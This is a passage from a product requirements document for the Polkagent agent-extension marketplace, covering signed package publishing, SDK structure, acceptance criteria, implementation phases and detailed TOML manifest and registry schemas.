# Step 5: Publish to a registry (submits package + cosign signature + in-toto attestation)
polkagent package publish --registry default

# Or publish to a specific registry
polkagent package publish --registry https://registry.internal:8443
```

The `--keyless` flag instructs the CLI to use Sigstore cosign v3 keyless
signing: an ephemeral key pair is generated, the public key is bound to a
short-lived OIDC certificate issued by Sigstore's Fulcio CA, and the signature
plus certificate are recorded in Rekor's transparency log. No long-lived
signing key needs to be stored or rotated. This is the required signing method
for packages targeting the Verified or Curated trust tiers.

Pre-publication checks (automated):

1. Manifest is valid and complete.
2. All conformance tests pass.
3. Package is signed with a valid cosign v3 signature (warning if unsigned).
4. in-toto provenance attestation is present and covers the build artifacts.
5. No known vulnerability in dependencies.
6. Content digest matches declared digest.
7. Version is higher than any published version (unless yanking).

Post-publication:

1. Registry performs automated scans (section 13.2).
2. Package appears in search results.
3. Trust tier is assigned based on publisher identity.
4. Compatibility testing runs against target platforms.

### 14.4 SDK crate structure

The Extension SDK is organized as Rust crates:

```
polkagent-sdk/
├── polkagent-sdk           # Main SDK crate, re-exports common items
├── polkagent-sdk-macros    # Procedural macros (#[polkagent_tool], etc.)
├── polkagent-sdk-types     # Shared types (manifest, capabilities, schemas)
├── polkagent-sdk-testing   # Test framework and mocks
└── polkagent-sdk-wasm      # WASM compilation support
```

#### 14.4.1 Schema-first manifest with proc-macro codegen and data-classification labels

The SDK uses a **schema-first, manifest-driven code generation** approach.
The `polkagent.manifest.toml` is the single source of truth; proc-macros and
a codegen step derive Rust types, WIT interface fragments, and JSON Schema
documents from it automatically. This means:

- Capability declarations in the manifest are reflected as compile-time-checked
  types in the tool implementation. A tool that calls a host function for a
  capability it did not declare in the manifest will fail to compile, not fail
  at runtime.
- Input and output schemas in the manifest generate the `JsonSchema`-derived
  types used by `PolkagentTool`. Schema drift between manifest and
  implementation is a compile error.
- `data_access` fields in the manifest (see section 4.5) are annotated with
  **data-classification labels** (`Public`, `Internal`, `Confidential`,
  `Restricted`) that flow through to generated types. The host enforces that a
  tool operating under a given classification ceiling cannot receive or return
  data tagged above that ceiling. Authors declare the labels in the manifest;
  the SDK enforces them in generated code.

The `#[polkagent_tool]` proc-macro (shown in section 14.1.2) invokes this
codegen pipeline. For non-Rust languages, a standalone `polkagent-codegen` CLI
reads the manifest and emits WIT definitions, JSON Schema files, and language-
specific stubs.

For non-Rust languages, a WASM interface is provided:

```
// WIT (WebAssembly Interface Type) definition
package polkagent:tool@1.0.0;

interface tool {
    record tool-input {
        data: string,
    }

    record tool-output {
        data: string,
        artifacts: list<artifact-ref>,
    }

    invoke: func(input: tool-input) -> result<tool-output, tool-error>;
    metadata: func() -> tool-metadata;
}
```

This allows tools to be written in any language that compiles to WASM
(Rust, Go, C/C++, AssemblyScript, etc.) while maintaining the same sandbox
and capability model.

---

## 15. Acceptance criteria and verification checklist

### 15.1 Manifest and taxonomy

| ID | Criterion | Verification method |
|---|---|---|
| MKT-001 | Every package type in section 3.1 has a valid manifest schema and at least one reference implementation. | Schema validation test + reference package build. |
| MKT-002 | A manifest with missing required fields is rejected with a clear error naming the missing fields. | Negative validation fixture. |
| MKT-003 | Capability declarations are enforced at runtime: undeclared capabilities are denied. | Sandbox capability denial test. |
| MKT-004 | Data access disclosure fields are displayed to operators during installation review. | UX review + automated display test. |
| MKT-005 | Dependency cycles are detected and rejected. | Cycle detection test with constructed cyclic graph. |

### 15.2 Registry

| ID | Criterion | Verification method |
|---|---|---|
| MKT-010 | A self-hosted registry starts, accepts a publication, and serves it to a resolver. | End-to-end test: init, serve, publish, resolve, download. |
| MKT-011 | A client can search, install, and activate a package from the default public registry. | End-to-end test against staging registry. |
| MKT-012 | Federation: a search fans out to federated peers and returns combined results with source attribution. | Multi-registry federation test. |
| MKT-013 | Mirroring: a mirror registry replicates selected packages and serves them independently. | Mirror + disconnect + serve test. |
| MKT-014 | Offline bundle: a bundle can be created, transferred, imported, and verified in an air-gapped environment. | Bundle create + verify + import test. |
| MKT-015 | Registry API versioning: a client can detect and handle registry API version mismatches. | Version negotiation test. |

### 15.3 Trust model

| ID | Criterion | Verification method |
|---|---|---|
| MKT-020 | Unsigned packages are installable with explicit operator opt-in and visible warnings. | UX test with unsigned package. |
| MKT-021 | Signed packages display the publisher identity correctly. | Signature verification + identity display test. |
| MKT-022 | Verified publisher identity is independently verifiable (Polkadot account signature, domain verification). | Identity verification test. |
| MKT-023 | Publisher identity revocation downgrades trust tier and notifies operators. | Revocation propagation test. |
| MKT-024 | Community ratings cannot grant capabilities or bypass policy. | Policy enforcement test with high-rated + low-trust package. |

### 15.4 Resolution and installation

| ID | Criterion | Verification method |
|---|---|---|
| MKT-030 | Dependency resolution finds a valid solution for a non-trivial dependency graph. | Resolution test with diamond dependency. |
| MKT-031 | Version conflicts produce a clear diagnostic identifying the conflicting constraints. | Conflict resolution test. |
| MKT-032 | The operator approval step displays all capabilities, data access, and trust signals before installation. | UX review + automated display test. |
| MKT-033 | Automated installation (CI/CD) uses pre-approved policies and does not prompt interactively. | Policy-based auto-install test. |
| MKT-034 | Lockfile captures exact versions, digests, and registry sources. Subsequent resolution from lockfile is deterministic. | Lockfile determinism test. |

### 15.5 Sandboxing

| ID | Criterion | Verification method |
|---|---|---|
| MKT-040 | A tool cannot access network hosts not in its declared capabilities. | Sandbox network isolation test. |
| MKT-041 | A tool cannot read or write filesystem paths not in its declared capabilities. | Sandbox filesystem isolation test. |
| MKT-042 | A tool cannot exceed declared resource limits (CPU, memory, network bandwidth). | Resource exhaustion test. |
| MKT-043 | A WASM-sandboxed tool cannot execute arbitrary system calls. | WASM sandbox escape test. |
| MKT-044 | A capability denial is logged with the package, capability, and context. | Audit log verification test. |
| MKT-045 | Resource exhaustion results in clean termination, not crash or undefined behavior. | Resource limit boundary test. |

### 15.6 Updates and revocation

| ID | Criterion | Verification method |
|---|---|---|
| MKT-050 | Update check detects available updates and displays them with change summary. | Update check test. |
| MKT-051 | Capability-changing updates require operator review regardless of auto-update policy. | Capability change detection test. |
| MKT-052 | Security advisories are displayed to operators and trigger configured actions. | Advisory handling test per severity. |
| MKT-053 | Publisher revocation prevents new installations and notifies existing installations. | Revocation propagation test. |
| MKT-054 | Rollback restores previous version with its capability grants. | Rollback test with version history. |
| MKT-055 | Yanked versions are excluded from resolution but accessible in existing lockfiles. | Yank behavior test. |

### 15.7 Product kits

| ID | Criterion | Verification method |
|---|---|---|
| MKT-060 | A product kit installs all required and selected optional constituent packages. | Kit installation test. |
| MKT-061 | Kit uninstallation removes only packages not shared with other installations. | Shared dependency uninstall test. |
| MKT-062 | Kit update checks compatibility of constituent package updates against kit constraints. | Kit update compatibility test. |
| MKT-063 | Kit capability summary is the union of constituent capabilities, displayed accurately. | Kit capability aggregation test. |
| MKT-064 | Kit trust summary reflects the minimum trust tier of required constituents. | Kit trust aggregation test. |

### 15.8 Extension SDK

| ID | Criterion | Verification method |
|---|---|---|
| MKT-070 | Package scaffolding generates a buildable, testable package for each supported type. | Scaffold + build + test for each type. |
| MKT-071 | Conformance tests catch manifest errors, capability violations, and resource overuse. | Deliberate violation test suite. |
| MKT-072 | WASM compilation produces a valid module that runs in the sandbox. | WASM build + sandbox execution test. |
| MKT-073 | Publishing workflow validates, signs, and uploads a package to a target registry. | End-to-end publish test. |
| MKT-074 | SDK documentation covers tool, skill, context pack, and product kit creation with examples. | Documentation review. |

### 15.9 Security and operations

| ID | Criterion | Verification method |
|---|---|---|
| MKT-080 | Malware scanning detects known malicious patterns at publication. | Malware fixture test. |
| MKT-081 | Credential harvesting patterns are detected and blocked. | Credential pattern test. |
| MKT-082 | Abuse response: a reported malicious package is removed within the defined timeline. | Simulated abuse response drill. |
| MKT-083 | Incident communication reaches operators with affected packages within the defined timeline. | Notification delivery test. |
| MKT-084 | Content digest verification detects tampering at download, import, and activation. | Tampering detection test. |
| MKT-085 | A self-hosted deployment operates fully without contacting the default public registry. | Air-gapped operation test. |

### 15.10 Permissionless and plural

| ID | Criterion | Verification method |
|---|---|---|
| MKT-090 | Any identity can publish a signed package to the default registry without editorial approval. | Permissionless publication test. |
| MKT-091 | An operator can configure their resolver to use only a self-hosted registry. | Registry override test. |
| MKT-092 | Sideloaded packages receive the same capability review and sandboxing as registry packages. | Sideload parity test. |
| MKT-093 | No single registry failure prevents a deployment from operating with its installed packages. | Registry unavailability test. |
| MKT-094 | Curated views do not prevent unsigned packages from being discoverable to expert users. | Discovery filter test. |

---

## 16. Phasing and maturity

### 16.1 Implementation phases

| Phase | Scope | Gate |
|---|---|---|
| **Phase 1: Foundation** | Manifest specification. Local package loading and sideloading. Capability declaration and enforcement. Basic sandbox (process isolation). CLI-based package management. | Conformance tests pass for all package types. Capability enforcement proven. |
| **Phase 2: Registry** | Self-hosted registry. Package resolution and lockfiles. Signing and verification. Update checking. Offline bundles. | End-to-end publish/resolve/install/update from self-hosted registry. |
| **Phase 3: Public registry** | Default public registry. Community ratings. Automated scanning. Security advisories. Federation. | Public registry operates with scanning, advisories, and federation. |
| **Phase 4: Product kits** | Kit composition and installation. Kit marketplace listing. Guided setup UX. | Kit install/update/uninstall with dependency management proven. |
| **Phase 5: Commercial** | Pricing models. Revenue sharing. Billing integration. Publisher verification. | Payment settlement, reconciliation, and dispute handling proven. |
| **Phase 6: WASM sandbox** | WASM-based tool execution (Wasmtime Component Model + WIT). Fuel + epoch + ResourceLimiter. Container isolation tier. | WASM sandbox escape tests pass. All three metering mechanisms proven active. |
| **Phase 7: Advanced** | On-chain registry integration. Agent service listings. Attested evaluations. | Controlled pilot with abuse response and operational readiness. |

### 16.1.1 Staged recommendations from supply-chain and sandbox research

The following recommendations are derived from research validated as of
July 2026. They are organized by urgency relative to the implementation phases
above.

**Do now (Phases 1–2):**
- Deploy the Wasmtime Component Model / WIT host as the canonical sandbox.
  Ensure all three metering mechanisms (fuel, epoch, `ResourceLimiter`) are
  explicitly enabled in sandbox initialization code.
- Integrate cosign v3 keyless signing and SLSA Build Level 2 provenance into
  the publish pipeline. Make verification mandatory at install time with pinned
  signer identity.
- Finalize the manifest schema with data-classification labels and proc-macro
  codegen from the start. Retrofitting these later is expensive.

**Validate next (Phase 3):**
- Implement and test capability attenuation enforcement at WIT composition
  boundaries. Confirm that composed packages cannot escalate capabilities
  beyond what the parent world grants.
- Surface RustSec-style security advisories on package pages before packages
  appear in default search results.
- Validate air-gapped mirror operation with a real air-gapped test environment,
  not just a network-disconnected unit test.

**Defer (Phase 5+):**
- On-chain registry storage and discovery. Requires mature chain infrastructure
  and is not needed for v1 adoption.
- Per-invocation billing via x402/stablecoin. Depends on mature autonomous
  payment infrastructure (PRD-08). Use periodic reconciliation for per-usage
  pricing in the interim.

**Avoid:**
- Extism as the plugin host for untrusted third-party packages. Its pinned
  Wasmtime dependency (`>=27,<31` as of v1.12.0, vs current v47.0.1) means
  security patches lag by multiple major releases. Use direct Wasmtime
  embedding instead.
- Signing pipelines that issue signatures without enforcing verification at
  install time. A signature that is not verified provides no security
  guarantee.

### 16.2 Maturity labels

Each feature carries a maturity label:

| Label | Meaning |
|---|---|
| **Stable** | Implemented, tested, documented, and supported. Covered by compatibility guarantees. |
| **Beta** | Implemented and tested. API may change. Not covered by full compatibility guarantees. |
| **Experimental** | Available behind a feature flag. API will change. Not for production use. |
| **Planned** | Designed but not yet implemented. Part of the roadmap. |
| **Research** | Under investigation. No implementation commitment. |

---

## 17. Cross-document interfaces

This section summarizes the interfaces between PRD-12 and other PRDs. Each
interface is described inline so that a reader does not need to open the
referenced PRD to understand this one.

### 17.1 PRD-02: Vocabulary and architecture

- **Package** is a domain entity in the Polkagent vocabulary.
- **Manifest** is an artifact type.
- **Lockfile** is an artifact type.
- The `ExtensionRegistry` port (section 6.4 of PRD-02) is the internal
  interface through which the runtime discovers installed packages.

### 17.2 PRD-03: Execution model

- Tool invocations go through the `ToolHost` port, which checks the sandbox
  and resolved grant before dispatching to the tool's implementation.
- Package-provided tools are registered in the tool catalog at activation.
- Each tool invocation is an effect with durable intent and outcome records.

### 17.3 PRD-04: Providers, models, harnesses, tools, skills

- `model_config` and `harness_config` packages extend the model catalog and
  harness registry through configured adapters.
- Skills and context packs are loaded into the context assembly pipeline.
- Tools are registered in the tool host with their sandbox configuration.

### 17.4 PRD-07: Identity, accounts, signers, policy, security

- Publisher identity uses the identity model defined in PRD-07.
- Capability enforcement uses the `ResolvedGrant` system from PRD-07.
- Package capabilities are one input to the grant intersection.

### 17.5 PRD-08: Payments, autonomous agents, economic controls

- Commercial packages use the payment rails from PRD-08 for settlement.
- The `economic` capability category is governed by the payment policy.
- Revenue sharing and fee configuration use the billing infrastructure.

### 17.6 PRD-11: Self-hosting, managed cloud, multi-tenancy

- Registry hosting is a deployment concern: self-hosted or managed.
- Package storage uses the artifact store from the data plane.
- Tenant-scoped package installations respect tenant boundaries.

### 17.7 PRD-15: Testing, security assurance

- Package conformance tests are part of the test pyramid.
- Sandbox escape testing is a security assurance requirement.
- Supply-chain security is a threat model concern.

---

## 18. Open questions and future work

| ID | Question | Resolution needed by |
|---|---|---|
| MKT-Q01 | ~~What is the exact WASM runtime (Wasmtime, Wasmer, or custom) and its security boundary?~~ **Resolved:** Wasmtime Component Model with WIT; fuel + epoch + ResourceLimiter (all opt-in, all must be explicitly enabled). Extism is not used for untrusted plugins due to slow security-patch uptake. See section 8.5. | Resolved 2026-07-30. |
| MKT-Q02 | How are on-chain registry entries structured if/when on-chain discovery is added? | Phase 7 design. |
| MKT-Q03 | What is the exact revenue-sharing settlement frequency and minimum payout? | Phase 5 commercial design. |
| MKT-Q04 | How do attested evaluations avoid gaming and Sybil attacks? | Phase 7 research. |
| MKT-Q05 | What organizational governance controls curated collection membership? | Phase 3 operations. |
| MKT-Q06 | How does the manifest format evolve without breaking existing packages? | Phase 2 versioning design. |
| MKT-Q07 | What legal framework governs publisher liability and dispute resolution? | Phase 5 legal review. |
| MKT-Q08 | How do agent service listings interact with the autonomous agent account system? | Phase 7 + PRD-08 integration. |

---

## 19. Requirement traceability

| Requirement source | Section in this PRD | Requirement IDs |
|---|---|---|
| Research brief Package K: permissionless publication | Section 2.1 | MKT-090, MKT-091, MKT-092, MKT-093, MKT-094 |
| Baseline 9.1: permissionless base | Section 2.1, 5.2 | MKT-090 |
| Baseline 9.2: safe discovery as UX layer | Section 2.1, 6.1 | MKT-094 |
| Baseline 9.3: package lifecycle | Section 7.3, 9 | MKT-030–034, MKT-050–055 |
| Research H1: product kits | Section 10 | MKT-060–064 |
| Research H2: capability-disclosed units | Section 4.4, 8 | MKT-003, MKT-040–045 |
| Research H3: self-hosted registries | Section 5.3, 12 | MKT-010, MKT-085 |
| Research H4: public agent-service listings | Section 3.1 (agent_service), 16.1 Phase 7 | MKT-Q08 |
| Roko Pattern 9: trust tiers before hook systems | Section 6.1, 8.2 | MKT-020–024, MKT-040–045 |
| Roko Pattern 13: marketplace contracts now, implement in phases | Section 16.1 | All phase gates |
| Threat model: marketplace extension as threat | Section 8, 13 | MKT-040–045, MKT-080–085 |

---

## APPENDIX A: MARKETPLACE IMPLEMENTATION BLUEPRINT

### A.1 Package Manifest Schema

This appendix provides the complete, field-by-field manifest specification for
every package type. The schemas here complement the structural overview in
section 4 with full validation rules and a concrete example for each type.

#### A.1.1 Universal manifest fields (all package types)

```toml
# polkagent.manifest.toml
# Schema version governs the parser used by the resolver.
schema_version = "1"

[package]
# --- Required identity fields ---

# Unique within the registry namespace. Format: lowercase alphanumeric and
# hyphens only. Must start with a letter. Max 64 characters.
# Validation: /^[a-z][a-z0-9-]{0,63}$/
name = "treasury-monitor"

# SemVer 2.0 string. Pre-release (1.0.0-alpha.1) and build metadata
# (1.0.0+build.1) are permitted but pre-release versions are excluded from
# automatic resolution.
# Validation: parsed by semver crate; must have major.minor.patch.
version = "1.0.0"

# Exactly one of the types listed in section 3.1.
# Validation: enum { skill, context_pack, tool, model_config, harness_config,
#              compute_provider, feed, agent_service, product_kit }
type = "skill"

# Human-readable summary. Max 500 characters. No Markdown.
description = "Monitor treasury proposals and spending on Polkadot and Kusama."

# SPDX expression. Required. Use "Proprietary" for closed-source.
# Validation: parsed by spdx crate.
license = "Apache-2.0"

# --- Optional identity fields ---

# Source repository. Must be a valid URL.
repository = "https://github.com/example/treasury-monitor"

# Documentation URL.
documentation = "https://docs.example.com/treasury-monitor"

# Up to 10 searchable keywords. Each: lowercase, max 30 chars, alphanumeric+hyphen.
keywords = ["polkadot", "treasury", "governance", "spending", "monitoring"]

# Up to 5 category tags from the registry taxonomy.
# Well-known categories: governance, defi, infrastructure, identity, developer,
#                        security, analytics, social, gaming, nft
categories = ["governance", "analytics"]

# Whether this package is deprecated. If true, description_deprecated is shown.
deprecated = false
# description_deprecated = "Use treasury-monitor-v2 instead."

[package.author]
# Human-readable author name. Not cryptographically verified.
name = "Example Team"
# Contact email. Optional. Not displayed publicly by default.
# email = "packages@example.com"
# Author URL.
# url = "https://example.com"

# --- Platform compatibility ---
[compatibility]
# SemVer constraint against the Polkagent runtime version.
polkagent_version = ">=0.4.0, <1.0.0"

# Rust edition, if the package contains compiled Rust code.
# Validation: enum { "2021", "2024" }
# rust_edition = "2024"

# Target architectures. Must be valid Rust target triples or "wasm32-wasip2".
# If omitted, all architectures are assumed compatible.
target_architectures = [
  "aarch64-apple-darwin",
  "x86_64-unknown-linux-gnu",
  "x86_64-apple-darwin",
  "aarch64-unknown-linux-gnu",
  "wasm32-wasip2",
]

# Chain profile compatibility. Optional. Resolver checks spec_version.
[compatibility.chain_profiles]
polkadot = { spec_version = ">=1003000" }
kusama   = { spec_version = ">=1003000" }
# asset-hub-polkadot = { spec_version = ">=1000000" }

# --- Capability declarations ---
# Every capability a package might use must be declared here.
# Undeclared capabilities are denied at runtime regardless of operator policy.
[capabilities]

# Network access. Hosts support wildcard prefix: "*.example.com".
[capabilities.network]
required = true
hosts = ["rpc.polkadot.io", "rpc.kusama.network", "*.parity.io"]
protocols = ["https", "wss"]
# ports = [443, 9944]   # Optional. Defaults to standard ports for protocol.
reason = "Query treasury and governance state from Polkadot and Kusama RPC endpoints."

# Read chain state. Pallets restricts read access to named pallets only.
[capabilities.chain_read]
required = true
networks = ["polkadot", "kusama"]
pallets = ["Treasury", "Referenda", "Identity", "Balances"]
# storage_keys = []  # Optional: restrict to specific storage keys within pallets.
reason = "Read treasury proposal state, spending, and linked identities."

# Write chain state. Declare only if the package submits extrinsics.
# [capabilities.chain_write]
# required = false
# networks = ["polkadot"]
# pallets = ["Treasury"]
# calls = ["spend_local", "approve_proposal"]
# reason = "..."

# Filesystem access. Paths must be absolute.
# [capabilities.filesystem]
# required = false
# read_paths = ["/workspace/reports/"]
# write_paths = ["/workspace/reports/"]
# reason = "..."

# Model invocation. Restricts which model providers may be called.
# [capabilities.model_invoke]
# required = false
# providers = ["anthropic", "openai"]
# families = ["claude-3", "gpt-4"]
# reason = "..."

# Tool invocation. Lists tools the package is permitted to call.
# [capabilities.tool_invoke]
# required = false
# tools = ["web_search@>=1.0.0", "format_markdown@>=1.0.0"]
# reason = "..."

# Memory access.
# [capabilities.memory_read]
# required = false
# scopes = ["workspace", "episodic"]
# classifications = ["Public", "Internal"]
# reason = "..."

# Secret access. Restricts to named categories of secrets.
# [capabilities.secret_read]
# required = false
# categories = ["rpc_api_key"]
# reason = "..."

# Process spawning. Restricts to named command prefixes.
# [capabilities.process_spawn]
# required = false
# commands = ["cargo", "node"]
# reason = "..."

# Economic capability. Enforces per-invocation spend limits.
# [capabilities.economic]
# required = false
# asset_types = ["DOT", "KSM"]
# max_amount_per_invocation = "0.1"
# networks = ["polkadot"]
# reason = "..."

# --- Data access disclosure ---
[data_access]
reads = ["chain_state:treasury", "chain_state:governance", "chain_state:identity"]
writes = []
stores = []
transmits = ["network:rpc_queries"]
classification_floor = "Public"
reason = "Reads on-chain treasury and governance data. No private data accessed or stored."

# --- Dependencies ---
[dependencies]
"polkadot-chain-profile" = { version = ">=1.0.0, <2.0.0", registry = "default" }
"openGov-schema"         = { version = "^2.0.0",          registry = "default" }
# Local sideloaded dependency:
# "my-local-helper" = { path = "/opt/polkagent/tools/my-local-helper" }
# Optional dependency:
# "report-formatter" = { version = "^1.0.0", optional = true }

[dev-dependencies]
"treasury-test-fixtures" = { version = ">=1.0.0", registry = "default" }

# --- Provenance (populated at build/publish time, not hand-authored) ---
[provenance]
# build_digest      = "sha256:e3b0c44298fc1c149afbf4c8996fb924..."
# manifest_hash     = "sha256:a665a45920422f9d417e4867efdc4fb8..."
# source_commit     = "abc123def456789"
# build_reproducible = true
# build_system      = "polkagent-build/0.4.0 cargo/1.80.0"
# build_timestamp   = "2026-07-30T12:00:00Z"
# slsa_level        = 2
# signature         = "..."   # cosign v3 keyless bundle (base64)
# signer_identity   = "https://github.com/example/treasury-monitor/.github/workflows/publish.yml@refs/heads/main"
# rekor_log_index   = 123456789

# Optional third-party attestations (audits, SLSA provenance, etc.)
# [[provenance.attestations]]
# type           = "security_audit"
# auditor        = "ExampleSec Ltd"
# auditor_identity = "polkadot:5ExampleSecAddress..."
# scope          = "Full source review of v1.0.0"
# date           = "2026-07-15"
# report_url     = "https://examplesec.com/audits/treasury-monitor-1.0.0.pdf"
# findings       = { critical = 0, high = 0, medium = 0, low = 2, resolved = 2 }
# signature      = "..."
```

#### A.1.2 Type-specific sections

**`skill` type:**

```toml
[skill]
# Tools the skill requires to be granted. Must match capability declarations.
tools_required = ["chain_read"]
# Tools that enhance the skill but are not required for core function.
tools_optional = ["web_search", "format_markdown"]
# Context packs loaded into the skill's context window.
context_packs = ["openGov-schema", "polkadot-track-reference"]
# Token budget estimates for the skill.
estimated_tokens = { min = 2000, typical = 8000, max = 32000 }
# Supported model capability level. The runtime selects a model that meets this.
# Validation: enum { basic, standard, extended, frontier }
model_capability = "standard"
# Whether the skill is stateless (same inputs always produce equivalent outputs).
stateless = false
```

**`tool` type:**

```toml
[tool]
# Execution target. Determines sandbox tier (see section 8.2).
# Validation: enum { wasm, process, rpc }
execution_target = "wasm"
# Path to the WASM module (relative to package root), or RPC endpoint spec.
wasm_module = "dist/treasury_monitor.wasm"
# JSON Schema files for input and output validation.
input_schema  = "schemas/input.json"
output_schema = "schemas/output.json"
# Resource limits the tool declares it needs (operator may restrict further).
[tool.resource_limits]
max_memory_mb         = 128
max_cpu_seconds       = 10
max_network_requests  = 50
max_network_bytes     = 5_000_000
```

**`context_pack` type:**

```toml
[context_pack]
# Content files included in the pack (relative paths from package root).
files = ["docs/treasury_guide.md", "schemas/treasury_types.json", "glossary.md"]
# Total approximate token count across all files.
approximate_tokens = 12000
# Data classification of all content in the pack.
classification = "Public"
# Whether content is versioned (changes in minor versions) or static.
stable_content = false
```

**`model_config` type:**

```toml
[model_config]
# Provider adapter type.
# Validation: enum { anthropic, openai, ollama, custom_openai_compat }
provider_type = "anthropic"
# Endpoint base URL. May use environment variable references: "${VAR}".
endpoint = "https://api.anthropic.com/v1"
# Authentication method.
# Validation: enum { api_key, oauth2, none }
auth_method = "api_key"
# Secret category for the key (matched against secret_read capability).
auth_secret_category = "anthropic_api_key"
# Model identifiers available through this config.
models = ["claude-opus-4-6", "claude-sonnet-4-6"]
# Pricing metadata for cost estimation (informational only).
[model_config.pricing]
currency = "USD"
input_per_million_tokens  = 15.00
output_per_million_tokens = 75.00
```

**`harness_config` type:**

```toml
[harness_config]
# Harness type determines which harness adapter is used.
# Validation: enum { rust_analyzer, aider, cursor, custom }
harness_type = "rust_analyzer"
# Launch configuration (process spec).
launch_command = ["rust-analyzer"]
# Environment variables injected at launch (may reference secrets).
# env = { "RA_LOG" = "info" }
# Workspace requirements.
[harness_config.workspace]
requires_cargo_workspace = true
requires_git             = true
min_disk_gb              = 2
```

**`feed` type:**

```toml
[feed]
# Source type determines the ingress adapter.
# Validation: enum { polkadot_rpc, webhook, http_poll, kafka, custom }
source_type = "polkadot_rpc"
# Polling interval (for poll-based feeds). Duration string: "30s", "5m", "1h".
poll_interval = "30s"
# Or for subscription-based feeds:
# subscription_method = "wss"
# Data schema (JSON Schema reference).
event_schema = "schemas/treasury_event.json"
# Cursor semantics for resumable consumption.
# Validation: enum { block_number, timestamp, offset, none }
cursor_type  = "block_number"
# Data classification of events produced by this feed.
event_classification = "Public"
```

**`agent_service` type:**

```toml
[agent_service]
# API schema for the service's external interface.
api_schema = "schemas/service_api.json"
# Supported invocation protocols.
protocols = ["https_json", "grpc"]
# SLA tier declared by the publisher.
# Validation: enum { best_effort, standard, premium }
sla_tier = "standard"
# Pricing (if commercial).
[agent_service.pricing]
model = "usage_metered"
unit  = "per_invocation"
price = "0.001"
currency = "USD"
```

**`product_kit` type:**

```toml
[kit]
# Constituent packages. Each entry specifies version constraint and role.
[kit.packages]
"treasury-monitor-skill"       = { version = "^1.0.0", role = "primary"  }
"chain-reader-tool"            = { version = "^2.0.0", role = "required" }
"openGov-schema"               = { version = "^2.0.0", role = "context"  }
"report-formatter-tool"        = { version = "^1.0.0", role = "optional" }

# Default configuration values. Operators may override during setup.
[kit.defaults]
target_networks  = ["polkadot", "kusama"]
auto_activate    = true
update_policy    = "auto_patch"   # enum { none, auto_patch, auto_minor }

# Kit-level policy defaults. Applied on top of individual package policies.
[kit.policy]
chain_write                  = false
max_rpc_requests_per_hour    = 1000
data_classification          = "Public"

# UX customization for the marketplace listing.
[kit.ux]
display_name      = "Treasury Monitor"
icon              = "assets/treasury-monitor-icon.svg"
short_description = "Monitor Polkadot and Kusama treasury activity in real time."
setup_guide       = "docs/setup.md"
category          = "governance"
screenshots       = ["assets/screenshots/overview.png", "assets/screenshots/detail.png"]

# Acceptance fixtures for kit-level integration tests.
[kit.fixtures]
test_manifest     = "fixtures/test-manifest.toml"
expected_outputs  = "fixtures/expected/"
```

#### A.1.3 Validation rules by field category

| Category | Rule | Error |
|---|---|---|
| `name` | `/^[a-z][a-z0-9-]{0,63}$/` | `manifest::name_invalid` |
| `version` | Valid SemVer 2.0 | `manifest::version_invalid` |
| `type` | Known enum value | `manifest::type_unknown` |
| `description` | 1–500 chars | `manifest::description_too_long` |
| `license` | Valid SPDX expression | `manifest::license_invalid` |
| `keywords` | Max 10, each max 30 chars, `[a-z0-9-]` | `manifest::keywords_invalid` |
| `categories` | Max 5, from taxonomy | `manifest::category_unknown` |
| `polkagent_version` | Valid SemVer constraint | `manifest::compat_constraint_invalid` |
| Capability `hosts` | Valid hostname or wildcard pattern | `manifest::capability_host_invalid` |
| Capability `networks` | Known network identifiers | `manifest::capability_network_unknown` |
| Capability `pallets` | Non-empty strings | `manifest::capability_pallet_empty` |
| `data_access.classification_floor` | `Public \| Internal \| Confidential \| Restricted` | `manifest::classification_unknown` |
| Dependency `version` | Valid SemVer constraint | `manifest::dep_version_invalid` |
| Dependency `registry` | Known registry name or `"default"` | `manifest::dep_registry_unknown` |
| Dependency `path` | Absolute path, existing at resolve time | `manifest::dep_path_not_found` |
| No circular dependencies | Cycle detection during resolution | `resolver::cycle_detected` |
| `type` + type section | Type section must match `type` field | `manifest::type_section_mismatch` |
| `context_pack` capabilities | No executable capabilities permitted | `manifest::context_pack_capability_forbidden` |

---

### A.2 Registry Architecture

#### A.2.1 Index format and storage

The registry index is a content-addressed, append-only structure. Each entry
is an immutable record keyed by `(name, version)`.

**On-disk layout for a minimal self-hosted registry:**

```
/var/lib/polkagent/registry/
├── db/
│   └── registry.sqlite3          # Package metadata, trust signals, advisory index
├── index/
│   ├── packages/
│   │   ├── a/
│   │   │   └── address-validator/
│   │   │       ├── 1.0.0.json    # Serialized PackageMetadata
│   │   │       └── 1.1.0.json
│   │   └── t/
│   │       └── treasury-monitor/
│   │           └── 1.0.0.json
│   └── search/
│       └── trigram.index         # Trigram search index (optional, rebuilt from db)
├── content/
│   ├── sha256/
│   │   ├── e3b0c4.../            # First 6 chars of digest as shard prefix
│   │   │   └── e3b0c44298...pak  # Package content archive (.pak)
│   │   └── a665a4.../
│   │       └── a665a45920...pak
├── advisories/
│   └── POLKA-2026-001.json       # Security advisory records
├── revocations/
│   └── treasury-monitor-1.0.0.json
└── config.toml                   # Registry configuration
```

**PackageMetadata JSON structure:**

```json
{
  "name": "treasury-monitor",
  "version": "1.0.0",
  "type": "skill",
  "description": "Monitor treasury proposals and spending on Polkadot and Kusama.",
  "license": "Apache-2.0",
  "keywords": ["polkadot", "treasury", "governance"],
  "categories": ["governance", "analytics"],
  "published_at": "2026-07-30T12:00:00Z",
  "publisher": {
    "id": "example-team",
    "display_name": "Example Team",
    "trust_tier": "verified",
    "identity_proofs": ["polkadot:5Example...", "domain:example.com"]
  },
  "digest": {
    "algorithm": "sha256",
    "hash": "e3b0c44298fc1c149afbf4c8996fb924...",
    "manifest_hash": "a665a45920422f9d417e4867efdc4fb8...",
    "merkle_root": "7b23e7c5a8d9f1b2..."
  },
  "signature": {
    "method": "cosign-v3-keyless",
    "bundle": "...",
    "rekor_log_index": 123456789,
    "signer_identity": "https://github.com/example/treasury-monitor/.github/workflows/publish.yml@refs/heads/main"
  },
  "capabilities_declared": {
    "network": { "hosts": ["rpc.polkadot.io", "rpc.kusama.network"] },
    "chain_read": { "networks": ["polkadot", "kusama"], "pallets": ["Treasury", "Referenda"] }
  },
  "dependencies": [
    { "name": "polkadot-chain-profile", "version_req": ">=1.0.0,<2.0.0" },
    { "name": "openGov-schema",         "version_req": "^2.0.0" }
  ],
  "compatibility": {
    "polkagent_version": ">=0.4.0,<1.0.0",
    "architectures": ["aarch64-apple-darwin", "x86_64-unknown-linux-gnu", "wasm32-wasip2"]
  },
  "trust_signals": {
    "install_count": 247,
    "rating_avg": 4.7,
    "rating_count": 23,
    "compatibility_checks": { "aarch64-apple-darwin": "pass", "x86_64-unknown-linux-gnu": "pass" },
    "vulnerability_status": "clean",
